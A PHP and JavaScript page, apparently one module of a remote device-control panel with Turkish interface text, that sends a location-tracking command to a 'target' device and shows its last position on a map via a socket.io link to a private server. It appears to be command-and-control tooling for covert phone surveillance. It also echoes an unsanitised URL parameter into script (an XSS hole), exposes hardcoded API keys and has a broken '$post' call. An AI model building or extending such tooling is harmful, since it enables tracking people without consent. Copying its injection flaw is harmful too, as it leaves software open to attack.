<?php 
require_once 'module_controller.php';

$uid_device = $_GET['target'];

?>

    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">

                <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
                <div class="col-md-10 col-lg-offset-0">
                </div>

                <div class="row"></div>
                <br><br>
                <legend>Kamera</legend>
                <div class="row">

                    <div id="location-tracker-id" style="height: 500px;"></div>

                </div>
                <br><br>
            </div>
        </div>
    </div>

<script>


      function showLocation(x_axis, y_axis) {
        var map = L.map('location-tracker-id').setView([x_axis, y_axis], 13);

        L.tileLayer('https://api.maptiler.com/maps/hybrid/256/{z}/{x}/{y}.jpg?key=AfK9oB1iMmoi4IsV5qSA', {
            attribution: '&copy; <a href="https://api.maptiler.com/maps/basic-v2/?key=qyOjaWdWXTptlQ44Y0JQ#0.2/-9.14509/64.15798">OpenMap</a> contributors'
        }).addTo(map);

        L.marker([x_axis, y_axis]).addTo(map)
            .bindPopup('Cihazın son konumu')
            .openPopup();
    };


    $("#btn-update-location").click(function() {
     console.log('test')
        $post( "commands.php", { get_location: '<?php echo $uid_device; ?>'}, function( data, err ) {

            if (data){
                Toastify({
                    text: "Komut gönderildi.!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
                showLocation(data.x_axis.replace("a",""), data.y_axis.replace("a",""));

            } else {
                Toastify({
                    text: "Komut başarısız.!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

    $("#command-sender-id").click(function() {
        $.post( "commands.php", { send_command: true, target:"<?php echo $uid_device;?>", type: "location_tracker", value: true}, function( data, err ) {
            if (data.status){
                Toastify({
                    text: "Komut gönderildi.!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
            } else {
                Toastify({
                    text: "Komut başarısız.!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });

    const socket = io('http://192.168.42.47:80');

    socket.on('connect', function(data) {
        socket.emit('join', 'Hello World from client');
    });

</script>
